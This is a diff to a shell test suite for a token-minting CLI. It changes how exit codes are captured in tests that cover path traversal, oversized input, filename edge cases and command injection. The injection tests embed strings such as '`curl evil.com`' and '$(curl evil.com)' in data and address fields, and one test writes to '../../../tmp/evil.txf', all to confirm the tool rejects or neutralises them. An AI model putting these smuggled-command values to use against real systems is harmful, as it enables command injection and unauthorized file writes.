@@ -120,11 +120,12 @@ teardown() {
 
     # Test 1: Parent directory traversal
     local traversal_path="../../../tmp/evil.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${traversal_path}"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${traversal_path}" || exit_code=$?
 
     # Depending on implementation: either fails, or writes to resolved path with warning
     # We accept both behaviors but file should not be written outside test area
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         warn "Path traversal allowed - check if file written outside safe area"
         # File should NOT exist outside test directory
         assert_file_not_exists "/tmp/evil.txf"
@@ -134,9 +135,10 @@ teardown() {
 
     # Test 2: Absolute path
     local absolute_path="/tmp/test-$(generate_unique_id).txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${absolute_path}"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${absolute_path}" || exit_code=$?
 
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         warn "Absolute path allowed - this may be intentional"
         # Clean up if created
         rm -f "${absolute_path}"
@@ -183,19 +185,21 @@ teardown() {
 
     # Test 3: Command injection in data field
     local cmd_in_data='`curl evil.com`'
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${cmd_in_data}' --local -o ${TEST_TEMP_DIR}/safe.txf"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${cmd_in_data}' --local -o ${TEST_TEMP_DIR}/safe.txf" || exit_code=$?
 
     # Should succeed - data is just bytes
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         # Verify no network call was made (data treated literally)
         log_info "Data field treated as literal string (no command execution)"
     fi
 
     # Test 4: Shell metacharacters in recipient address
     local cmd_in_address='DIRECT://$(curl evil.com)'
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${TEST_TEMP_DIR}/token-cmd.txf"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o ${TEST_TEMP_DIR}/token-cmd.txf" || exit_code=$?
 
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         run_cli_with_secret "${ALICE_SECRET}" "send-token -f ${TEST_TEMP_DIR}/token-cmd.txf -r '${cmd_in_address}' --local -o /dev/null"
 
         # Should fail with invalid address format (not execute command)
@@ -218,11 +222,12 @@ teardown() {
 
     # Test 1: Very large coin amount (but valid)
     local huge_amount="999999999999999999999999999999"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${huge_amount} --local -o ${TEST_TEMP_DIR}/huge.txf"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c ${huge_amount} --local -o ${TEST_TEMP_DIR}/huge.txf" || exit_code=$?
 
     # JavaScript BigInt should handle this
     # Network may reject if exceeds protocol limits
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         log_info "Large amount accepted (BigInt handling)"
 
         # Verify amount stored correctly
@@ -243,10 +248,11 @@ teardown() {
     assert_output_contains "negative" || assert_output_contains "invalid" || assert_output_contains "amount"
 
     # Test 3: Zero amount
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 0 --local -o ${TEST_TEMP_DIR}/zero.txf"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset uct -c 0 --local -o ${TEST_TEMP_DIR}/zero.txf" || exit_code=$?
 
     # May succeed or fail depending on protocol rules
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         log_info "Zero amount allowed"
     else
         log_info "Zero amount rejected"
@@ -281,13 +287,14 @@ teardown() {
     local very_large_data=$(printf 'B%.0s' {1..1048576})
 
     # Use timeout to prevent hanging
-    run timeout 30s bash -c "SECRET='${ALICE_SECRET}' node $(get_cli_path) mint-token --preset nft -d '${very_large_data}' --local -o ${TEST_TEMP_DIR}/verylarge.txf 2>&1" || true
+    local exit_code=0
+    run timeout 30s bash -c "SECRET='${ALICE_SECRET}' node $(get_cli_path) mint-token --preset nft -d '${very_large_data}' --local -o ${TEST_TEMP_DIR}/verylarge.txf 2>&1" || exit_code=$?
 
     # Accept either success or graceful failure
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         log_info "Very large data accepted"
         assert_file_exists "${TEST_TEMP_DIR}/verylarge.txf"
-    elif [[ $status -eq 124 ]]; then
+    elif [[ $exit_code -eq 124 ]]; then
         warn "Command timed out - may need size limits"
     else
         log_info "Very large data rejected (size limits enforced)"
@@ -362,9 +369,10 @@ teardown() {
     local null_suffix=".txf.malicious"
 
     # Try to create file with embedded null-like sequence
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${filename}${null_suffix}'"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${filename}${null_suffix}'" || exit_code=$?
 
-    if [[ $status -eq 0 ]]; then
+    if [[ $exit_code -eq 0 ]]; then
         # Verify file was created with full name (no truncation)
         if [[ -f "${filename}${null_suffix}" ]]; then
             log_info "Full filename preserved (no null byte truncation)"
@@ -382,10 +390,11 @@ teardown() {
 
     # Test 3: Unicode characters in filename
     local unicode_filename="${TEST_TEMP_DIR}/token-文件.txf"
-    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${unicode_filename}'"
+    local exit_code=0
+    run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft --local -o '${unicode_filename}'" || exit_code=$?
 
     # Should succeed on systems with UTF-8 support
-    if [[ $status -eq 0 ]] && [[ -f "${unicode_filename}" ]]; then
+    if [[ $exit_code -eq 0 ]] && [[ -f "${unicode_filename}" ]]; then
         log_info "Unicode filenames supported"
     fi
 
@@ -405,10 +414,11 @@ teardown() {
     for size in "${boundaries[@]}"; do
         local boundary_data=$(printf 'X%.0s' $(seq 1 ${size}))
 
-        run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${boundary_data}' --local -o ${TEST_TEMP_DIR}/boundary-${size}.txf"
+        local exit_code=0
+        run_cli_with_secret "${ALICE_SECRET}" "mint-token --preset nft -d '${boundary_data}' --local -o ${TEST_TEMP_DIR}/boundary-${size}.txf" || exit_code=$?
 
         # Should succeed for all reasonable sizes
-        if [[ $status -eq 0 ]]; then
+        if [[ $exit_code -eq 0 ]]; then
             log_debug "Boundary size ${size} handled correctly"
         else
             log_debug "Boundary size ${size} rejected"
